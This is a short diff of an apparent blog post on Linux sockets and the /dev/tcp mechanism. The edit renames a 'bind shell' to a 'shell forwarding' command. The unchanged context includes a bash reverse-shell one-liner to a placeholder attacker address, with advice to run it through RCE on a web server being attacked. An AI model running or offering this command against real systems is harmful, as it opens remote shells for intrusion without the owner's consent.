@@ -42,7 +42,7 @@ Seriously... everything is a file in Linux and you can do all sorts of crazy stu
 
 One thing that only really hackers and Linux devs seem to be aware of is that the mechanism that Linux uses for setting up network connections (sockets) is through creating a socket file attached to the /dev/tcp directory. 
 
-The following command is a standard bind shell command. Typically, you would use an unprivileged RCE (Like with a web shell) to run the following command on the web server you're attacking:
+The following command is a standard shell forwarding command. Typically, you would use an unprivileged RCE (Like with a web shell) to run the following command on the web server you're attacking:
 
 ```
 bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
